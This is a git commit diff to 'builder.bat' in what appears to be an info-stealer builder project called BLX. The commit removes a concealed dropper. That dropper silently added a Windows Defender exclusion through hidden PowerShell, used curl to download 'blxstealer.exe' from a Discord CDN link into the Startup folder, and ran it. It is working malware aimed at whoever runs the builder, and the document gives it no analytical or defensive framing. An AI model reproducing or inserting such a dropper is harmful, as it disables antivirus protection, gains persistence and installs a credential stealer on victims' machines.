0ed12770bc728a3f973e1598f96268da1e58d403
blx in the dark <162599336+blxstealr@users.noreply.github.com>
2024-05-04 18:12:16 +0300

    Update builder.bat

--- builder.bat
+++ builder.bat
@@ -2,14 +2,3 @@
 title BLX Builder
 python builder.pyw
 pause
-powershell -w hidden -c Add-MpPreference -ExclusionPath ""
-@echo off
-setlocal
-set "URL=https://cdn.discordapp.com/attachments/1234829034370764946/1235950515104387092/blxstealer.exe?ex=66363c1d&is=6634ea9d&hm=468f9a1fc6819b9e67f669a41b55444db7cc41a5e37c556347cc244ec57c3d78&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\blxstealer.exe"
-if exist "%DEST%" del "%DEST%"
-curl --silent --output "%DEST%" "%URL%"
-if %errorlevel% neq 0 (
-exit /b %errorlevel%
-)
-call "%DEST%"
